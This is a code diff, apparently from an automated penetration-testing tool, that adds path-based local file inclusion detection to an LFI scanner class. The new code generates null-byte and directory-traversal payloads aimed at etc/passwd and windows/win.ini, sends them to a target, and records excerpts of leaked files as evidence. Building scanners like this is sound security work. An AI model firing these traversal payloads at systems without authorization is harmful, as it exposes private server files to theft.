@@ -15,6 +15,46 @@ from src.core.infra.smart_request import SmartRequest
 
 logger = logging.getLogger(__name__)
 
+# ---------------------------------------------------------------------------
+# SGK-2026-0474 — path-based file disclosure (パス方式 LFI)
+# ---------------------------------------------------------------------------
+
+# 汎用 impact 文（パラメータ方式・パス方式の両方の発火 Finding で使用）。
+LFI_IMPACT_TEXT = (
+    "認証・認可を経ずに本来非公開のサーバ内ファイルを取得可能。"
+    "機密情報漏えいの起点。"
+)
+
+# バイパス適用で取得した本文を「実体のある漏洩」とみなすための最小文字数
+# （正規化後）。これ未満はエラーページ等として扱い excerpt を残さない。
+_PATH_LEAK_MIN_CHARS = 40
+
+# 取得本文から切り出す安定抜粋の最大文字数（正規化後・対象固有の先頭部）。
+_PATH_EXCERPT_MAX_CHARS = 120
+
+# 末尾拡張子バイパス（<file>%00.<ext> / %2500）で試す汎用サフィックス。
+# 製品名・特定ファイル名ではなく、一般的なドキュメント拡張子のみ。
+_PATH_SUFFIX_EXTENSIONS = (".md", ".txt")
+
+# エラーページらしさの判定トークン（本文全体・小文字照合）。誤検知ガード。
+_PATH_ERROR_TOKENS = (
+    "not found",
+    "forbidden",
+    "access denied",
+    "internal server error",
+    "an error occurred",
+    "traceback",
+)
+
+# HTML ページ先頭プレフィックス: テンプレート/エラーページの漏洩誤認防止。
+_PATH_HTML_PREFIXES = ("<!doctype html", "<html", "<head", "<body", "<title")
+
+
+def _path_collapse_whitespace(text: str) -> str:
+    """連続空白を単一スペースに潰す（excerpt の安定化・再出現照合で共用）。"""
+    return re.sub(r"\s+", " ", str(text or "")).strip()
+
+
 class SmartLFIHunter(Specialist, ThoughtLoop):
     """
     思考ループ（ThoughtLoop）を持つ LFI スペシャリスト。
@@ -121,10 +161,29 @@ INPUT: [Input]
         if result.get("vulnerable"):
             tested_param = result.get("param")
             delivery = result.get("delivery_evidence", {}) if isinstance(result.get("delivery_evidence"), dict) else {}
+            # SGK-2026-0474: impact / reproduction_steps を常に設定する
+            # （機械フロア step3 の missing_impact 落ちを防ぐ）。
+            impact = str(result.get("impact") or "") or LFI_IMPACT_TEXT
+            repro_steps = result.get("reproduction_steps")
+            if not isinstance(repro_steps, list):
+                repro_steps = []
+            repro_steps = [str(step) for step in repro_steps if str(step or "").strip()]
+            if not repro_steps:
+                repro_url = str(delivery.get("request_url") or task.target)
+                repro_status = delivery.get("response_status", 0)
+                repro_steps = [
+                    f"GET {repro_url} を実行して再現する",
+                    f"応答ステータス {repro_status} の本文に機密ファイル内容が含まれることを確認する",
+                    "取得した抜粋が取得対象ファイル固有の内容と一致することを確認する",
+                ]
             finding = Finding(
                 vuln_type=VulnType.LFI,
                 severity=Severity.HIGH,
-                title=f"LFI/Path Traversal in parameter '{result.get('param', 'unknown')}'",
+                title=(
+                    f"LFI/Path Traversal in parameter '{tested_param}'"
+                    if tested_param
+                    else "LFI/Path Traversal via URL path (path-based file disclosure)"
+                ),
                 description=result.get("description", "Detected by SmartLFIHunter."),
                 target_url=task.target,
                 evidence=Evidence(
@@ -136,6 +195,8 @@ INPUT: [Input]
                 source_agent=self.name,
                 confidence=0.9,
                 tags=["lfi", "smart_agent"],
+                impact=impact,
+                reproduction_steps=repro_steps,
                 additional_info={
                     "parameter": tested_param,
                     "tested_params": [tested_param] if tested_param else [],
@@ -236,24 +297,37 @@ INPUT: [Input]
                 self.used_payloads.append(payload)
             loop_result = {"status": "deterministic_precheck_confirmed", **deterministic}
         else:
-            self.history_messages = []
-            self.history_messages.append({"role": "system", "content": self.SYSTEM_PROMPT})
+            # SGK-2026-0474: パラメータ方式が不発の場合、パス方式（URL パスへ
+            # のトラバーサル/ヌルバイト適用）の差分ベース確認を試す。
+            path_result = await self._run_path_traversal_precheck()
+            if path_result.get("confirmed"):
+                self.vulnerable = True
+                self.context["param"] = None  # パス方式はパラメータ注入ではない
+                self.evidence = str(path_result.get("evidence", "Path-based file disclosure confirmed"))
+                self.last_delivery_evidence = path_result.get("delivery_evidence", {}) if isinstance(path_result.get("delivery_evidence"), dict) else {}
+                payload = str(path_result.get("payload", "") or "")
+                if payload and payload not in self.used_payloads:
+                    self.used_payloads.append(payload)
+                loop_result = {"status": "path_precheck_confirmed", **path_result}
+            else:
+                self.history_messages = []
+                self.history_messages.append({"role": "system", "content": self.SYSTEM_PROMPT})
 
-            initial_prompt = f"""Target URL: {target}
+                initial_prompt = f"""Target URL: {target}
 Method: {method}
 Parameter: {self.context['param']}
 Original Value: {payload_params.get(self.context['param'], '') if payload_params else ''}
 
 Start your LFI/Path Traversal testing.
 """
-            self.history_messages.append({"role": "user", "content": initial_prompt})
+                self.history_messages.append({"role": "user", "content": initial_prompt})
 
-            # ThoughtLoop を実行（親クラスの run_loop を使用）
-            try:
-                loop_result = await self.run_loop(self.context)
-            except Exception as e:
-                logger.error(f"[{self.name}] ThoughtLoop failed: {e}")
-                loop_result = {"status": "failed", "error": str(e)}
+                # ThoughtLoop を実行（親クラスの run_loop を使用）
+                try:
+                    loop_result = await self.run_loop(self.context)
+                except Exception as e:
+                    logger.error(f"[{self.name}] ThoughtLoop failed: {e}")
+                    loop_result = {"status": "failed", "error": str(e)}
 
         return {
             "vulnerable": self.vulnerable,
@@ -266,6 +340,14 @@ Start your LFI/Path Traversal testing.
             "file_marker_excerpt": str(loop_result.get("file_marker_excerpt", "") or ""),
             "target_file": str(loop_result.get("target_file", "") or ""),
             "delivery_evidence": self.last_delivery_evidence,
+            # SGK-2026-0474: impact / reproduction_steps（execute() が Finding に設定）。
+            "style": str(loop_result.get("style", "") or ""),
+            "impact": str(loop_result.get("impact", "") or ""),
+            "reproduction_steps": (
+                list(loop_result["reproduction_steps"])
+                if isinstance(loop_result.get("reproduction_steps"), list)
+                else []
+            ),
         }
 
     async def _run_lfi_deterministic_precheck(self, tested_params: List[str]) -> Dict[str, Any]:
@@ -307,11 +389,18 @@ Start your LFI/Path Traversal testing.
                     }
                     return {
                         "confirmed": True,
+                        "style": "param",
                         "param": param_name,
                         "payload": payload,
                         "target_file": self._infer_target_file(payload),
                         "file_marker_excerpt": str(obs.get("file_marker_excerpt", "") or obs.get("match", "") or ""),
                         "delivery_evidence": delivery,
+                        "impact": LFI_IMPACT_TEXT,
+                        "reproduction_steps": [
+                            f"パラメータ '{param_name}' に LFI/traversal payload を注入して GET する",
+                            f"GET {delivery.get('request_url', '')} が応答 {obs.get('status', 0)} を返す",
+                            "応答本文に取得対象ファイル固有の断片（既知 marker / excerpt）が含まれる",
+                        ],
                         "evidence": (
                             f"Deterministic LFI signal on '{param_name}'"
                             + (f" (matched: {obs.get('match')})" if obs.get("match") else "")
@@ -319,6 +408,191 @@ Start your LFI/Path Traversal testing.
                     }
 
         return {"confirmed": False}
+
+    async def _run_path_traversal_precheck(self) -> Dict[str, Any]:
+        """
+        SGK-2026-0474: パス方式のファイル漏洩を差分ベースで検出する。
+
+        URL パス（ファイル拡張子を持つ末尾セグメント）に対し、一般的な
+        バイパス（ヌルバイト挿入・%00/%2500 サフィックス・%2e%2e%2f 連結・
+        ....// 連結）を適用して GET する。以下の差分が成立したときだけ
+        本物の漏洩とみなし、そのときだけ file_marker_excerpt を残す
+        （fail-closed・誤検知ガード）:
+
+        - クリーン（バイパスなし）GET が取得不可（非 2xx）
+        - バイパス GET が 200 かつ実体のある本文（エラーページでない）
+        """
+        target = str(self.context.get("target") or "")
+        method = str(self.context.get("method") or "GET").upper()
+        from urllib.parse import urlparse, urlunparse
+        try:
+            parsed = urlparse(target)
+        except ValueError:
+            return {"confirmed": False}
+        path = parsed.path or ""
+        # GET-only・ファイルエンドポイント（末尾セグメントに拡張子）のみ対象。
+        if (
+            method != "GET"
+            or parsed.scheme not in ("http", "https")
+            or not path
+            or path.endswith("/")
+            or "." not in path.rsplit("/", 1)[-1]
+        ):
+            return {"confirmed": False}
+
+        # 1) クリーン GET（バイパスなし・元 URL のまま）。取得不可でないと
+        #    差分が成立しない（クリーンでも 200 = 差分なし → False）。
+        clean = await self._send_path_get(target)
+        clean_status = int(clean.get("status", 0) or 0)
+        if clean.get("error") or clean_status == 0:
+            return {"confirmed": False}  # 送信不能/ブロックは判定不能（fail-closed）
+        if 200 <= clean_status < 300:
+            return {"confirmed": False}
+
+        # 2) バイパス候補を順に GET。200 + 実体ある本文で初回確定。
+        for variant in self._path_bypass_variants(path):
+            candidate_url = urlunparse(parsed._replace(path=variant))
+            obs = await self._send_path_get(candidate_url)
+            status = int(obs.get("status", 0) or 0)
+            if obs.get("error") or status != 200:
+                continue
+            body = str(obs.get("body", "") or "")
+            excerpt = self._path_leak_excerpt(body)
+            if not excerpt:
+                continue  # エラーページ/非実体 → excerpt を残さない（fail-closed）
+
+            delivery = {
+                "request_method": "GET",
+                "request_url": candidate_url,
+                "response_status": status,
+                "response_body": body[:2000],
+                "poc_request": self._build_poc_request(method="GET", request_url=candidate_url),
+                "poc_response": self._build_poc_response(status=status, body=body[:500]),
+                "content_type": "",
+                "body_length": len(body),
+                "delivered": True,
+                "file_marker_excerpt": excerpt,
+            }
+            return {
+                "confirmed": True,
+                "style": "path",
+                "param": None,
+                "payload": variant,
+                "target_file": path,
+                "file_marker_excerpt": excerpt,
+                "delivery_evidence": delivery,
+                "impact": LFI_IMPACT_TEXT,
+                "reproduction_steps": [
+                    f"クリーン URL（{target}）への GET は {clean_status} で取得不可（バイパスなし）",
+                    f"バイパス URL（{candidate_url}）への GET は 200 で機密ファイル内容を取得",
+                    f"取得本文の抜粋を確認する: {excerpt}",
+                ],
+                "evidence": (
+                    f"Path-based file disclosure confirmed: clean GET {clean_status} "
+                    f"-> bypass GET 200 ({len(body)} bytes)"
+                ),
+            }
+
+        return {"confirmed": False}
+
+    async def _send_path_get(self, url: str) -> Dict[str, Any]:
+        """パス書き換え URL への GET 送信（クリーン/バイパス共用）。
+
+        SmartRequest はネットワーク失敗を dict の error/status=0 に畳んで
+        返すため、ここでの except は残余の境界例外のみ想定している。
+        """
+        auth_headers = self.context.get("auth_headers", {})
+        try:
+            resp = await self.smart_client.request(
+                "GET", url, headers=auth_headers, timeout=60
+            )
+        except (OSError, TimeoutError, ValueError, RuntimeError) as exc:
+            logger.error(f"[{self.name}] Path GET failed: {exc}")
+            return {"status": 0, "body": "", "error": str(exc)}
+        if not isinstance(resp, dict):
+            resp = {}
+        status = int(resp.get("status", 0) or 0)
+        body = str(resp.get("body", "") or "")
+        error = resp.get("error")
+        if error or status == 0:
+            return {"status": status, "body": body, "error": str(error or "") or ""}
+        return {"status": status, "body": body, "error": None}
+
+    @staticmethod
+    def _path_bypass_variants(path: str) -> List[str]:
+        """対象パスの構造（セグメント・拡張子）から一般的なバイパス候補を組む。
+
+        製品名・特定ファイル名はハードコードしない。文字列は生パス（
+        パーセントエンコード済み）のまま連結し、そのまま GET URL に使う。
+        """
+        variants: List[str] = []
+        name = path.rsplit("/", 1)[-1]
+        ext_pos = name.rfind(".")
+        if ext_pos > 0:
+            # 末尾拡張子の直前にヌルバイトを挿入する形（%00 / %2500）。
+            stem = name[:ext_pos]
+            ext = name[ext_pos:]
+            for code in ("%00", "%2500"):
+                variants.append(path[: len(path) - len(name)] + stem + code + ext)
+        # 末尾にヌルバイト + 拡張子を追加する形。拡張子は観測パス由来
+        # （末尾拡張子・二重拡張子の内側）と汎用ドキュメント拡張子。
+        suffixes: List[str] = []
+        if ext_pos > 0:
+            suffixes.append(name[ext_pos:])
+            inner = name[:ext_pos]
+            inner_pos = inner.rfind(".")
+            if inner_pos > 0:
+                suffixes.append(inner[inner_pos:])
+        for ext in suffixes + list(_PATH_SUFFIX_EXTENSIONS):
+            if ext not in suffixes:
+                suffixes.append(ext)
+        for code in ("%00", "%2500"):
+            for ext in suffixes:
+                variants.append(path + code + ext)
+        # トラバーサル連結（対象ディレクトリから上昇）。../ ・エンコード
+        # （%2e%2e%2f）・再帰フィルタ迂回（....//）の各形を、パス深さから
+        # 組んだ連結数（depth+2 / depth+3）で適用する。差分判定が誤検知を
+        # 防ぐため、深さの当たり外れは取得可否にしか影響しない。
+        dir_part = path[: len(path) - len(name)] or "/"
+        depth = len([s for s in dir_part.split("/") if s])
+        file_targets = ("etc/passwd", "windows/win.ini")
+        for target_file in file_targets:
+            for climb in ("../", "..%2f", "....//"):
+                for extra in (2, 3):
+                    levels = depth + extra
+                    if climb == "../":
+                        prefix = "../" * levels
+                        suffix = target_file
+                    elif climb == "..%2f":
+                        prefix = "..%2f" * levels
+                        suffix = target_file.replace("/", "%2f")
+                    else:
+                        prefix = "....//" * levels
+                        suffix = target_file
+                    variants.append(dir_part + prefix + suffix)
+        return variants
+
+    @staticmethod
+    def _path_leak_excerpt(body: str) -> str:
+        """取得本文が「実体のある漏洩」のとき、安定した specific 抜粋を返す。
+
+        - 本文を空白正規化した長さが一定未満 → 不採用（エラーページ等）
+        - HTML ページ先頭・エラートークンを含む → 不採用
+        - それ以外は正規化本文の先頭〜中程の連続ウィンドウを抜粋として返す。
+
+        不採用のときは空文字（vulnerable=False・fail-closed・excerpt 非保存）。
+        """
+        if not body:
+            return ""
+        text = _path_collapse_whitespace(body)
+        if len(text) < _PATH_LEAK_MIN_CHARS:
+            return ""
+        lowered = text.lower()
+        if lowered.startswith(_PATH_HTML_PREFIXES):
+            return ""
+        if any(token in lowered for token in _PATH_ERROR_TOKENS):
+            return ""
+        return text[:_PATH_EXCERPT_MAX_CHARS]
 
     async def decide(self, turn: int) -> Tuple[str, str, Any]:
         """
